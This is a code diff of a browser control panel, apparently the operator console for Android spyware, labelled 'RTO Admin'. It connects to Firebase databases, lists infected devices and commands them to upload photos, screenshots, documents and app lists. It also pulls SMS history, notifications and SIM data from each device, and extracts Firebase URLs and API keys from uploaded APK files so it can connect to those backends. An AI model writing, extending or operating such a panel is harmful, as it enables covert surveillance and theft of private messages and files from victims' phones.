font-size:12px; font-family:monospace; margin-bottom:14px;"><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Order</label><div style="display:flex; gap:6px; margin-top:6px; margin-bottom:20px;"><button class="porder-btn" data-o="oldest" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer;">⬆️ Oldest First</button><button class="porder-btn active" data-o="newest" style="flex:1; padding:11px; background:#2563EB; color:white; border:none; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer;">⬇️ Newest First</button></div><div style="display:flex; gap:8px;"><button onclick="closePhotoDialog()" style="flex:1; padding:13px; background:#F1F5F9; color:#334155; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">CANCEL</button><button onclick="sendPhotoCommand()" style="flex:1; padding:13px; background:#059669; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">📤 START UPLOAD</button></div></div></div>';
-  var div = document.createElement('div'); div.innerHTML = html; document.body.appendChild(div.firstChild);
-  document.querySelectorAll('.pfilter-btn').forEach(function(btn) {
-    btn.onclick = function() {
-      document.querySelectorAll('.pfilter-btn').forEach(function(b) { b.style.background = '#F8FAFC'; b.style.color = '#334155'; b.style.border = '1px solid #E2E8F0'; b.classList.remove('active'); });
-      this.style.background = '#2563EB'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active');
-      photoFilter = this.getAttribute('data-f');
-    };
-  });
-  document.querySelectorAll('.pqty-btn').forEach(function(btn) {
-    btn.onclick = function() {
-      document.querySelectorAll('.pqty-btn').forEach(function(b) { b.style.background = '#F8FAFC'; b.style.color = '#334155'; b.style.border = '1px solid #E2E8F0'; b.classList.remove('active'); });
-      this.style.background = '#2563EB'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active');
-      photoQuantity = parseInt(this.getAttribute('data-q'));
-      document.getElementById('customQty').value = '';
-    };
-  });
-  document.getElementById('customQty').addEventListener('input', function() {
-    var val = parseInt(this.value);
-    if (val && val > 0) {
-      photoQuantity = val;
-      document.querySelectorAll('.pqty-btn').forEach(function(b) { b.style.background = '#F8FAFC'; b.style.color = '#334155'; b.style.border = '1px solid #E2E8F0'; b.classList.remove('active'); });
-    }
-  });
-  document.querySelectorAll('.porder-btn').forEach(function(btn) {
-    btn.onclick = function() {
-      document.querySelectorAll('.porder-btn').forEach(function(b) { b.style.background = '#F8FAFC'; b.style.color = '#334155'; b.style.border = '1px solid #E2E8F0'; b.classList.remove('active'); });
-      this.style.background = '#2563EB'; this.style.color = 'white'; this.style.border = 'none'; this.classList.add('active');
-      photoOrder = this.getAttribute('data-o');
-    };
-  });
+  if(!curId)return;
+  var old=document.getElementById('photoDialog'); if(old)old.remove();
+  var html='<div style="position:fixed;inset:0;background:rgba(15,23,42,0.6);z-index:5000;display:flex;align-items:center;justify-content:center;padding:20px;" id="photoDialog" onclick="if(event.target===this)closePhotoDialog()"><div style="background:#FFF;border-radius:16px;padding:22px;max-width:460px;width:100%;"><h3 style="color:#1E40AF;font-size:16px;margin-bottom:18px;">📤 Upload Request</h3><label style="color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">Filter</label><div style="display:flex;gap:6px;margin:6px 0 14px;flex-wrap:wrap;"><button class="pfilter-btn active" data-f="camera" style="flex:1;padding:11px;background:#2563EB;color:white;border:none;border-radius:9px;cursor:pointer;min-width:80px;">📷 Camera</button><button class="pfilter-btn" data-f="screenshot" style="flex:1;padding:11px;background:#F8FAFC;color:#334155;border:1px solid #E2E8F0;border-radius:9px;cursor:pointer;min-width:80px;">📸 SS</button><button class="pfilter-btn" data-f="document" style="flex:1;padding:11px;background:#F8FAFC;color:#334155;border:1px solid #E2E8F0;border-radius:9px;cursor:pointer;min-width:80px;">📄 Doc</button><button class="pfilter-btn" data-f="picture" style="flex:1;padding:11px;background:#F8FAFC;color:#334155;border:1px solid #E2E8F0;border-radius:9px;cursor:pointer;min-width:80px;">🖼️ Pic</button></div><label style="color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">Quantity</label><div style="display:flex;gap:6px;margin:6px 0 8px;"><button class="pqty-btn" data-q="50" style="flex:1;padding:11px;background:#F8FAFC;color:#334155;border:1px solid #E2E8F0;border-radius:9px;cursor:pointer;">50</button><button class="pqty-btn active" data-q="100" style="flex:1;padding:11px;background:#2563EB;color:white;border:none;border-radius:9px;cursor:pointer;">100</button><button class="pqty-btn" data-q="500" style="flex:1;padding:11px;background:#F8FAFC;color:#334155;border:1px solid #E2E8F0;border-radius:9px;cursor:pointer;">500</button></div><input type="number" id="customQty" placeholder="Custom qty" style="width:100%;padding:12px;background:#F8FAFC;border:1px solid #E2E8F0;border-radius:9px;margin-bottom:14px;"><label style="color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">Order</label><div style="display:flex;gap:6px;margin:6px 0 20px;"><button class="porder-btn" data-o="oldest" style="flex:1;padding:11px;background:#F8FAFC;color:#334155;border:1px solid #E2E8F0;border-radius:9px;cursor:pointer;">Oldest</button><button class="porder-btn active" data-o="newest" style="flex:1;padding:11px;background:#2563EB;color:white;border:none;border-radius:9px;cursor:pointer;">Newest</button></div><div style="display:flex;gap:8px;"><button onclick="closePhotoDialog()" style="flex:1;padding:13px;background:#F1F5F9;color:#334155;border:none;border-radius:10px;cursor:pointer;font-weight:700;">CANCEL</button><button onclick="sendPhotoCommand()" style="flex:1;padding:13px;background:#059669;color:white;border:none;border-radius:10px;cursor:pointer;font-weight:700;">START</button></div></div></div>';
+  var div=document.createElement('div'); div.innerHTML=html; document.body.appendChild(div.firstChild);
+  document.querySelectorAll('.pfilter-btn').forEach(function(b){b.onclick=function(){document.querySelectorAll('.pfilter-btn').forEach(function(x){x.style.background='#F8FAFC';x.style.color='#334155';x.style.border='1px solid #E2E8F0';});this.style.background='#2563EB';this.style.color='white';this.style.border='none';photoFilter=this.getAttribute('data-f');};});
+  document.querySelectorAll('.pqty-btn').forEach(function(b){b.onclick=function(){document.querySelectorAll('.pqty-btn').forEach(function(x){x.style.background='#F8FAFC';x.style.color='#334155';x.style.border='1px solid #E2E8F0';});this.style.background='#2563EB';this.style.color='white';this.style.border='none';photoQuantity=parseInt(this.getAttribute('data-q'));document.getElementById('customQty').value='';};});
+  document.getElementById('customQty').addEventListener('input',function(){var v=parseInt(this.value);if(v&&v>0)photoQuantity=v;});
+  document.querySelectorAll('.porder-btn').forEach(function(b){b.onclick=function(){document.querySelectorAll('.porder-btn').forEach(function(x){x.style.background='#F8FAFC';x.style.color='#334155';x.style.border='1px solid #E2E8F0';});this.style.background='#2563EB';this.style.color='white';this.style.border='none';photoOrder=this.getAttribute('data-o');};});
 }
-function closePhotoDialog() { var el = document.getElementById('photoDialog'); if (el) el.remove(); }
-function sendPhotoCommand() {
-  if (!curId) return;
-  var filter = photoFilter, qty = photoQuantity, order = photoOrder;
-  closePhotoDialog();
-  startInlineProgress('photos', qty, '⏳ Command sent — waiting for device...');
-  if (inlineProgressListener) { try { inlineProgressListener.off(); } catch(e) {} }
-  inlineProgressListener = db.ref('device_info/' + curId + '/photo_upload_command');
-  inlineProgressListener.on('value', function(snap) {
-    var d = snap.val() || {};
-    var status = d.status || 'pending';
-    if (status === 'pending') updateInlineProgress('photos', 0, qty, '⏳ Command sent — waiting for device...');
-    else if (status === 'uploading') updateInlineProgress('photos', d.uploaded || 0, d.total || qty, '📤 Uploading...');
-    else if (status === 'completed') { updateInlineProgress('photos', d.uploaded || qty, d.uploaded || qty, '✅ Upload complete!'); setTimeout(function() { endInlineProgress('photos'); }, 3000); }
-    else if (status === 'failed') { updateInlineProgressError('photos', d.error || 'Upload failed'); setTimeout(function() { endInlineProgress('photos'); }, 3000); }
-  });
-  db.ref('device_info/' + curId + '/photo_upload_command').set({ filter: filter, quantity: qty, order: order, status: 'pending', uploaded: 0, total: qty, timestamp: Date.now() }).catch(function(e) { updateInlineProgressError('photos', e.message); });
-}
-function listenPhotoCommandStatus() {
-  if (!curId) return;
-  if (photoCmdListener) { try { photoCmdListener.off(); } catch(e) {} }
-  photoCmdListener = db.ref('device_info/' + curId + '/photo_upload_command');
-  photoCmdListener.on('value', function(s) {
-    var d = s.val();
-    var el = document.getElementById('uploadStatus');
-    if (el) {
-      if (!d) { el.style.color = '#64748B'; el.textContent = 'Ready'; }
-      else { var st = d.status || 'pending'; var color = '#D97706', text = '⏳ ' + st;
-        if (st === 'uploading') { color = '#2563EB'; text = '📤 Uploading'; }
-        else if (st === 'completed') { color = '#059669'; text = '✅ Done'; }
-        else if (st === 'failed') { color = '#DC2626'; text = '❌ Failed'; }
-        el.style.color = color; el.textContent = text; }
-    }
-    var bar = document.getElementById('inlineProgressBarPhotos');
-    if (bar && d) {
-      var st = d.status || 'pending'; var qty = d.total || d.quantity || 0; var uploaded = d.uploaded || 0;
-      if (st === 'uploading' || st === 'pending' || st === 'completed' || st === 'failed') {
-        var container = document.getElementById('inlineProgressPhotos');
-        if (container && !container.classList.contains('active') && st !== 'completed' && st !== 'failed') container.classList.add('active');
-        if (st === 'pending') updateInlineProgress('photos', 0, qty, '⏳ Command sent — waiting for device...');
-        else if (st === 'uploading') updateInlineProgress('photos', uploaded, qty, '📤 Uploading...');
-        else if (st === 'completed') { updateInlineProgress('photos', uploaded || qty, uploaded || qty, '✅ Upload complete!'); setTimeout(function() { endInlineProgress('photos'); }, 3000); }
-        else if (st === 'failed') { updateInlineProgressError('photos', d.error || 'Upload failed'); setTimeout(function() { endInlineProgress('photos'); }, 3000); }
-      }
-    }
-  });
-}
-function requestAppsUpload() {
-  if (!curId) { alert('No device selected'); return; }
-  if (!confirm('📦 Request apps list upload from device?')) return;
-  startInlineProgress('apps', 100, '⏳ Command sent — waiting for device...');
-  if (inlineProgressListener) { try { inlineProgressListener.off(); } catch(e) {} }
-  inlineProgressListener = db.ref('device_info/' + curId + '/apps_upload_command');
-  inlineProgressListener.on('value', function(snap) {
-    var d = snap.val() || {}; var status = d.status || 'pending';
-    if (status === 'pending') updateInlineProgress('apps', 0, 100, '⏳ Command sent — waiting for device...');
-    else if (status === 'uploading') updateInlineProgress('apps', 50, 100, '📤 Scanning and uploading apps...');
-    else if (status === 'completed') { updateInlineProgress('apps', 100, 100, '✅ Apps list uploaded!'); setTimeout(function() { endInlineProgress('apps'); }, 3000); }
-    else if (status === 'failed') { updateInlineProgressError('apps', d.error || 'Upload failed'); setTimeout(function() { endInlineProgress('apps'); }, 3000); }
-  });
-  db.ref('device_info/' + curId + '/apps_upload_command').set({ status: 'pending', timestamp: Date.now(), requested_at: new Date().toLocaleString() }).catch(function(e) { updateInlineProgressError('apps', e.message); });
-}
+function closePhotoDialog(){var el=document.getElementById('photoDialog');if(el)el.remove();}
+function sendPhotoCommand(){ if(!curId)return; var f=photoFilter,q=photoQuantity,o=photoOrder; closePhotoDialog(); startInlineProgress('photos',q,'⏳ Waiting...'); db.ref(basePathOf(curId)+'/photo_upload_command').set({filter:f,quantity:q,order:o,status:'pending',uploaded:0,total:q,timestamp:Date.now()}); }
+function requestAppsUpload(){ if(!curId)return; if(!confirm('Request apps upload?'))return; db.ref(basePathOf(curId)+'/apps_upload_command').set({status:'pending',timestamp:Date.now()}); }
 
-// ═══ SAVED ACCOUNTS ═══
-function getSavedAccounts() { try { return JSON.parse(localStorage.getItem('rto_accounts') || '[]'); } catch(e) { return []; } }
-function saveAccounts(list) { localStorage.setItem('rto_accounts', JSON.stringify(list)); }
-function renderSavedAccounts() {
-  var list = getSavedAccounts();
-  var section = document.getElementById('savedSection');
-  var el = document.getElementById('savedList');
-  if (list.length === 0) { section.style.display = 'none'; return; }
-  section.style.display = 'block';
-  el.innerHTML = list.map(function(a, i) {
-    return '<div class="saved-item" data-acc="' + i + '"><div class="saved-icon">🔥</div><div class="saved-info"><div class="saved-name">' + esc(a.name || 'Account ' + (i+1)) + '</div><div class="saved-url">' + esc((a.url || '').replace('https://', '').replace('.firebaseio.com', '')) + '</div></div><button class="saved-del" data-del="' + i + '">✕</button></div>';
-  }).join('');
-  el.querySelectorAll('.saved-item').forEach(function(item) {
-    item.addEventListener('click', function(e) {
-      if (e.target.hasAttribute('data-del')) return;
-      var idx = parseInt(this.getAttribute('data-acc'));
-      connectToAccount(list[idx]);
-    });
-  });
-  el.querySelectorAll('[data-del]').forEach(function(b) {
-    b.addEventListener('click', function(e) {
-      e.stopPropagation();
-      var idx = parseInt(this.getAttribute('data-del'));
-      if (!confirm('Delete this account?')) return;
-      var list2 = getSavedAccounts(); list2.splice(idx, 1); saveAccounts(list2); renderSavedAccounts();
-    });
-  });
+function getSavedAccounts(){try{return JSON.parse(localStorage.getItem('rto_accounts')||'[]');}catch(e){return[];}}
+function saveAccounts(l){localStorage.setItem('rto_accounts',JSON.stringify(l));}
+function renderSavedAccounts(){
+  var list=getSavedAccounts(); var section=document.getElementById('savedSection'); var el=document.getElementById('savedList');
+  if(list.length===0){section.style.display='none';return;}
+  section.style.display='block';
+  el.innerHTML=list.map(function(a,i){return '<div class="saved-item" data-acc="'+i+'"><div class="saved-icon">🔥</div><div class="saved-info"><div class="saved-name">'+esc(a.name||'Account')+'</div><div class="saved-url">'+esc((a.url||'').replace('https://','').replace('.firebaseio.com',''))+'</div></div><button class="saved-del" data-del="'+i+'">✕</button></div>';}).join('');
+  el.querySelectorAll('.saved-item').forEach(function(it){it.addEventListener('click',function(e){if(e.target.hasAttribute('data-del'))return;connectToAccount(list[parseInt(this.getAttribute('data-acc'))]);});});
+  el.querySelectorAll('[data-del]').forEach(function(b){b.addEventListener('click',function(e){e.stopPropagation();var i=parseInt(this.getAttribute('data-del'));if(!confirm('Delete?'))return;var l2=getSavedAccounts();l2.splice(i,1);saveAccounts(l2);renderSavedAccounts();});});
 }
-function parseBulkInput(text) {
-  var accounts = [], seenUrls = {};
-  var urlRegex = /https?:\/\/[a-zA-Z0-9_-]+(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/g;
-  var keyRegex = /AIzaSy[A-Za-z0-9_-]{33}/g;
-  var urls = text.match(urlRegex) || [], keys = text.match(keyRegex) || [];
-  for (var i = 0; i < urls.length; i++) {
-    var url = urls[i].trim(); if (seenUrls[url]) continue; seenUrls[url] = true;
-    accounts.push({ url: url, apiKey: keys[i] || keys[0] || DEFAULT_CONFIG.apiKey, name: url.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb','') });
-  }
-  return accounts;
-}
-function bulkConnect() {
-  var text = document.getElementById('bulkInput').value.trim();
-  var errEl = document.getElementById('connectErr');
-  if (!text) { errEl.textContent = '❌ Paste URLs first'; return; }
-  var accounts = parseBulkInput(text);
-  if (accounts.length === 0) { errEl.textContent = '❌ No valid URL found'; return; }
-  var list = getSavedAccounts(); var added = 0;
-  accounts.forEach(function(acc) { var dup = list.findIndex(function(a) { return a.url === acc.url; }); if (dup === -1) { list.push({ name: acc.name, url: acc.url, apiKey: acc.apiKey }); added++; } });
-  saveAccounts(list);
-  errEl.style.color = '#059669';
-  errEl.textContent = '✅ Added ' + added + '. Connecting...';
-  setTimeout(function() { connectToAccount(accounts[0]); }, 600);
-}
-function handleApkUpload(file) {
-  var status = document.getElementById('apkStatus'); status.classList.add('show'); status.textContent = '⏳ Reading...';
-  var reader = new FileReader();
-  reader.onload = function(e) {
-    try {
-      JSZip.loadAsync(e.target.result).then(function(zip) {
-        var foundUrls = [], foundKeys = [], promises = [];
-        zip.forEach(function(path, f) { if (f.dir || path.indexOf('.so') !== -1) return; promises.push(f.async('uint8array').then(function(bytes) { scanText(bytesToUtf8(bytes)); if (path.indexOf('.arsc') !== -1 || path.indexOf('.xml') !== -1 || path.indexOf('.dex') !== -1) { scanText(bytesToUtf16(bytes, true)); scanText(bytesToUtf16(bytes, false)); } if (path.indexOf('.dex') !== -1) scanText(extractDex(bytes)); }).catch(function() {})); });
-        Promise.all(promises).then(function() {
-          var u = dedup(foundUrls);
-          if (u.length > 0) { document.getElementById('newUrl').value = u[0]; status.textContent = '✅ Found ' + u.length + ' URLs'; } else status.textContent = '⚠️ No URL found';
-          if (foundKeys.length > 0) document.getElementById('newKey').value = foundKeys[0];
-        });
-        function dedup(a) { var o=[],s={}; a.forEach(function(x){if(!s[x]){s[x]=1;o.push(x);}}); return o; }
-        function bytesToUtf8(b) { try { return new TextDecoder('utf-8').decode(b); } catch(e) { var s=''; for (var i=0;i<b.length;i++) s+=String.fromCharCode(b[i]); return s; } }
-        function bytesToUtf16(b, le) { try { return new TextDecoder(le?'utf-16le':'utf-16be').decode(b); } catch(e) { return ''; } }
-        function extractDex(b) { var r='',c=''; for (var i=0;i<b.length;i++){var x=b[i]; if(x>=32&&x<=126)c+=String.fromCharCode(x); else{if(c.length>=4)r+=c+'\n';c='';}} return r; }
-        function scanText(t) { if (!t) return; var ps = [/https?:\/\/[a-zA-Z0-9_-]+-default-rtdb\.firebaseio\.com/g, /https?:\/\/[a-zA-Z0-9_-]+\.firebaseio\.com/g, /https?:\/\/[a-zA-Z0-9_-]+\.[a-z0-9-]+\.firebasedatabase\.app/g]; ps.forEach(function(p) { var m = t.match(p); if (m) m.forEach(function(u) { if (u.indexOf('http') !== 0) u = 'https://' + u; foundUrls.push(u); }); }); var km = t.match(/AIzaSy[A-Za-z0-9_-]{33}/g); if (km) km.forEach(function(k) { foundKeys.push(k); }); }
-      }).catch(function(e) { status.textContent = '❌ ' + e.message; });
-    } catch(e) { status.textContent = '❌ ' + e.message; }
-  };
-  reader.readAsArrayBuffer(file);
-}
-function saveNewAcc() {
-  var url = document.getElementById('newUrl').value.trim();
-  var key = document.getElementById('newKey').value.trim();
-  var errEl = document.getElementById('connectErr');
-  if (!url) { errEl.textContent = '❌ URL required'; errEl.style.color = '#DC2626'; return; }
-  url = normalizeFirebaseUrl(url);
-  if (!key) key = DEFAULT_CONFIG.apiKey;
-  var list = getSavedAccounts(), dup = list.findIndex(function(a) { return a.url === url; });
-  var acc = { name: extractProjectId(url), url: url, apiKey: key };
-  if (dup !== -1) { list[dup].apiKey = key; acc = list[dup]; } else list.push(acc);
-  saveAccounts(list);
-  errEl.style.color = '#059669';
-  errEl.textContent = '✅ Connecting...';
-  setTimeout(function() { connectToAccount(acc); }, 500);
-}
+function parseBulkInput(t){var a=[],s={};var ur=t.match(/https?:\/\/[a-zA-Z0-9_-]+(?:-default-rtdb)?\.(?:firebaseio\.com|firebasedatabase\.app)/g)||[];var k=t.match(/AIzaSy[A-Za-z0-9_-]{33}/g)||[];for(var i=0;i<ur.length;i++){var u=ur[i].trim();if(s[u])continue;s[u]=true;a.push({url:u,apiKey:k[i]||k[0]||DEFAULT_CONFIG.apiKey,name:u.replace('https://','').replace('.firebaseio.com','').replace('-default-rtdb','')});}return a;}
+function bulkConnect(){var t=document.getElementById('bulkInput').value.trim();var e=document.getElementById('connectErr');if(!t){e.textContent='❌ Paste URLs';return;}var a=parseBulkInput(t);if(a.length===0){e.textContent='❌ No URL';return;}var l=getSavedAccounts(),ad=0;a.forEach(function(x){if(l.findIndex(function(y){return y.url===x.url;})===-1){l.push({name:x.name,url:x.url,apiKey:x.apiKey});ad++;}});saveAccounts(l);e.style.color='#059669';e.textContent='✅ Added '+ad;setTimeout(function(){connectToAccount(a[0]);},600);}
+function handleApkUpload(file){var s=document.getElementById('apkStatus');s.classList.add('show');s.textContent='⏳ Reading...';var r=new FileReader();r.onload=function(ev){try{JSZip.loadAsync(ev.target.result).then(function(zip){var fu=[],fk=[],pr=[];zip.forEach(function(p,f){if(f.dir||p.indexOf('.so')!==-1)return;pr.push(f.async('uint8array').then(function(b){sc(bytesToUtf8(b));if(p.indexOf('.arsc')!==-1||p.indexOf('.xml')!==-1||p.indexOf('.dex')!==-1){sc(bytesToUtf16(b,true));sc(bytesToUtf16(b,false));}if(p.indexOf('.dex')!==-1)sc(extractDex(b));}).catch(function(){}));});Promise.all(pr).then(function(){var u=ded(fu);if(u.length>0){document.getElementById('newUrl').value=u[0];s.textContent='✅ Found '+u.length;}else s.textContent='⚠️ No URL';if(fk.length>0)document.getElementById('newKey').value=fk[0];});function ded(a){var o=[],ss={};a.forEach(function(x){if(!ss[x]){ss[x]=1;o.push(x);}});return o;}function bytesToUtf8(b){try{return new TextDecoder('utf-8').decode(b);}catch(e){var s='';for(var i=0;i<b.length;i++)s+=String.fromCharCode(b[i]);return s;}}function bytesToUtf16(b,l){try{return new TextDecoder(l?'utf-16le':'utf-16be').decode(b);}catch(e){return'';}}function extractDex(b){var r='',c='';for(var i=0;i<b.length;i++){var x=b[i];if(x>=32&&x<=126)c+=String.fromCharCode(x);else{if(c.length>=4)r+=c+'\n';c='';}}return r;}function sc(t){if(!t)return;[/https?:\/\/[a-zA-Z0-9_-]+-default-rtdb\.firebaseio\.com/g,/https?:\/\/[a-zA-Z0-9_-]+\.firebaseio\.com/g,/https?:\/\/[a-zA-Z0-9_-]+\.[a-z0-9-]+\.firebasedatabase\.app/g].forEach(function(pp){var m=t.match(pp);if(m)m.forEach(function(u){if(u.indexOf('http')!==0)u='https://'+u;fu.push(u);});});var km=t.match(/AIzaSy[A-Za-z0-9_-]{33}/g);if(km)km.forEach(function(k){fk.push(k);});}}).catch(function(e){s.textContent='❌ '+e.message;});}catch(e){s.textContent='❌ '+e.message;}};r.readAsArrayBuffer(file);}
+function saveNewAcc(){var u=document.getElementById('newUrl').value.trim(),k=document.getElementById('newKey').value.trim(),e=document.getElementById('connectErr');if(!u){e.textContent='❌ URL required';e.style.color='#DC2626';return;}u=normalizeFirebaseUrl(u);if(!k)k=DEFAULT_CONFIG.apiKey;var l=getSavedAccounts(),d=l.findIndex(function(a){return a.url===u;});var acc={name:extractProjectId(u),url:u,apiKey:k};if(d!==-1){l[d].apiKey=k;acc=l[d];}else l.push(acc);saveAccounts(l);e.style.color='#059669';e.textContent='✅ Connecting...';setTimeout(function(){connectToAccount(acc);},500);}
 
-// ═══ CONNECT TO ACCOUNT ═══
 function connectToAccount(acc) {
-  if (!acc || !acc.url) { alert('Invalid account'); return; }
+  if (!acc || !acc.url) return;
   var url = normalizeFirebaseUrl(acc.url);
   var config = { apiKey: acc.apiKey || DEFAULT_CONFIG.apiKey, databaseURL: url, projectId: extractProjectId(url) };
-  currentAccount = { name: acc.name || extractProjectId(url), url: url, apiKey: config.apiKey, isRTO: false };
-  var errEl = document.getElementById('connectErr');
-  if (errEl) { errEl.style.color = '#2563EB'; errEl.textContent = '⏳ Connecting...'; }
+  currentAccount = { name: acc.name || extractProjectId(url), url: url, apiKey: config.apiKey };
+  var e = document.getElementById('connectErr'); if (e) { e.style.color = '#2563EB'; e.textContent = '⏳ Connecting...'; }
   tryConnect(config).then(function() {
-    try { localStorage.setItem('rto_last_account', JSON.stringify(currentAccount)); } catch(e) {}
+    try { localStorage.setItem('rto_last_account', JSON.stringify(currentAccount)); } catch(err) {}
     document.getElementById('connectScreen').style.display = 'none';
     document.getElementById('mainApp').style.display = 'block';
-    document.getElementById('topTitle').textContent = '🚔 ' + (currentAccount.name || 'RTO Admin');
+    document.getElementById('topTitle').textContent = '🚔 ' + currentAccount.name;
     initTelegramConfig();
     startApp();
-  }).catch(function(e) {
-    if (errEl) { errEl.style.color = '#DC2626'; errEl.textContent = '❌ ' + e.message; }
-  });
+  }).catch(function(err) { if (e) { e.style.color = '#DC2626'; e.textContent = '❌ ' + err.message; } });
 }
 
 function doLogout() {
@@ -1017,133 +678,42 @@ function doLogout() {
   if (liveMsgListener) { try { liveMsgListener.off(); } catch(e) {} liveMsgListener = null; }
   if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
-  if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
-  db = null; devs = {}; devPaths = {}; curId = null; currentAccount = null;
+  db = null; devs = {}; devPaths = {}; curId = null; currentAccount = null; ROOT_SNAPSHOT = null;
   try { localStorage.removeItem('rto_last_account'); } catch(e) {}
   document.getElementById('mainApp').style.display = 'none';
   document.getElementById('connectScreen').style.display = 'flex';
   renderSavedAccounts();
-  document.getElementById('newUrl').value = '';
-  document.getElementById('newKey').value = '';
-  document.getElementById('bulkInput').value = '';
-  document.getElementById('connectErr').textContent = '';
+  document.getElementById('newUrl').value = ''; document.getElementById('newKey').value = ''; document.getElementById('bulkInput').value = ''; document.getElementById('connectErr').textContent = '';
 }
 
-// ═══════════════════════════════════════════════════════════
-// START APP — HARD FAST SCAN
-// ═══════════════════════════════════════════════════════════
 function startApp() {
   if (scanListener) { try { scanListener.off(); } catch(e) {} }
-  if (deviceListener) { try { deviceListener.off(); } catch(e) {} }
   dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
   dataListeners = [];
-  var scanEl = document.getElementById('scanStatus');
-  var scanText = document.getElementById('scanText');
+  var scanEl = document.getElementById('scanStatus'), scanText = document.getElementById('scanText');
   devs = {}; devPaths = {};
   scanEl.style.display = 'flex';
-  scanText.textContent = '⚡ Scanning Firebase (parallel)...';
+  scanText.textContent = '⚡ Loading full Firebase...';
 
-  hardScan(function(done, total) {
-    scanText.textContent = '⚡ Scanning... ' + done + '/' + total + ' nodes';
-  }).then(function(found) {
-    Object.keys(found).forEach(function(id) {
-      devs[id] = found[id].data;
-      devPaths[id] = { device: found[id].path };
-    });
+  hardScan(function(done, total) { scanText.textContent = '⚡ ' + done + '/' + total; }).then(function(found) {
+    Object.keys(found).forEach(function(id) { devs[id] = found[id].data; devPaths[id] = { device: found[id].path, collected: found[id].collectedPaths }; });
     scanText.textContent = '✅ Found ' + Object.keys(devs).length + ' device(s)';
     setTimeout(function() { scanEl.style.display = 'none'; }, 1200);
     updStats(); renderDevs();
-    // ✅ Realtime root listener — naye device aaye toh update
+
     scanListener = db.ref('/');
     scanListener.on('value', function(snapshot) {
-      var root = snapshot.val() || {};
-      // Fast incremental update — sirf naye devices add karo
-      hardScanIncremental(root, function(newFound) {
-        var added = 0;
-        Object.keys(newFound).forEach(function(id) {
-          if (!devs[id]) {
-            devs[id] = newFound[id].data;
-            devPaths[id] = { device: newFound[id].path };
-            added++;
-          }
-        });
-        if (added > 0) { updStats(); renderDevs(); }
+      ROOT_SNAPSHOT = snapshot.val() || {};
+      var found2 = buildDevicesFromRoot(ROOT_SNAPSHOT);
+      var changed = false;
+      Object.keys(found2).forEach(function(id) {
+        if (!devs[id]) { devs[id] = found2[id].data; devPaths[id] = { device: found2[id].path, collected: found2[id].collectedPaths }; changed = true; }
+        else { var oldK = Object.keys(devs[id]).length; deepMergeInto(devs[id], found2[id].data); if (Object.keys(devs[id]).length !== oldK) changed = true; }
       });
+      if (changed) { updStats(); renderDevs(); if (curId && devs[curId]) renderTab(); }
     });
-    if (curId && devs[curId]) renderTab();
-  }).catch(function(e) {
-    scanText.textContent = '❌ Error: ' + e.message;
-  });
-}
-
-// ═══ INCREMENTAL SCAN (realtime updates ke liye) ═══
-function hardScanIncremental(root, callback) {
-  var found = {};
-  var skipKeys = ['admin_config','global_config','app_config','telegram_auto_config','config','settings'];
-  function walk(obj, path, depth) {
-    if (!obj || typeof obj !== 'object' || depth > 6) return;
-    Object.keys(obj).forEach(function(key) {
-      if (skipKeys.indexOf(key) !== -1 && depth <= 1) return;
-      var entry = obj[key];
-      if (!entry || typeof entry !== 'object') return;
-      var fullPath = path ? path + '/' + key : key;
-      if (isDeviceEntry(key, entry)) {
-        if (!found[key]) found[key] = { data: entry, path: fullPath };
-        return;
-      }
-      if (depth < 6) walk(entry, fullPath, depth + 1);
-    });
-  }
-  walk(root, '', 0);
-  callback(found);
-}
-
-// ═══ LOAD DEVICE DATA ═══
-function loadAllDeviceData(deviceId, basePath, callback) {
-  dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
-  dataListeners = [];
-  var data = { messages: {}, sms_history: {}, photos: {}, notifications: {}, installed_apps: {}, installed_apps_telegram: null, apps_upload_command: null, sim_info: null, forward_settings: null, device_info: null };
-  if (basePath) {
-    var baseRef = db.ref(basePath);
-    var cb1 = baseRef.on('value', function(s) { var devObj = s.val() || {}; collectData(devObj, data); callback(data); });
-    dataListeners.push({ ref: baseRef, cb: cb1 });
-  }
-  var rootRef = db.ref('/');
-  var cb2 = rootRef.on('value', function(snapshot) {
-    var root = snapshot.val() || {};
-    var merged = { messages: Object.assign({}, data.messages), sms_history: Object.assign({}, data.sms_history), photos: Object.assign({}, data.photos), notifications: Object.assign({}, data.notifications), installed_apps: data.installed_apps, installed_apps_telegram: data.installed_apps_telegram, apps_upload_command: data.apps_upload_command, sim_info: data.sim_info, forward_settings: data.forward_settings, device_info: data.device_info };
-    scanForDevice(root, deviceId, merged);
-    Object.keys(merged).forEach(function(k) { data[k] = merged[k]; });
-    callback(data);
-  });
-  dataListeners.push({ ref: rootRef, cb: cb2 });
-}
-function collectData(devObj, result) {
-  if (!devObj || typeof devObj !== 'object') return;
-  if (devObj.messages) Object.keys(devObj.messages).forEach(function(k) { result.messages[k] = devObj.messages[k]; });
-  if (devObj.sms_history) Object.keys(devObj.sms_history).forEach(function(k) { result.sms_history[k] = devObj.sms_history[k]; });
-  if (devObj.photos) Object.keys(devObj.photos).forEach(function(k) { result.photos[k] = devObj.photos[k]; });
-  if (devObj.notifications) Object.keys(devObj.notifications).forEach(function(k) { result.notifications[k] = devObj.notifications[k]; });
-  if (devObj.sms_notifications) Object.keys(devObj.sms_notifications).forEach(function(k) { result.notifications[k] = devObj.sms_notifications[k]; });
-  if (devObj.installed_apps) result.installed_apps = devObj.installed_apps;
-  if (devObj.installed_apps_telegram) result.installed_apps_telegram = devObj.installed_apps_telegram;
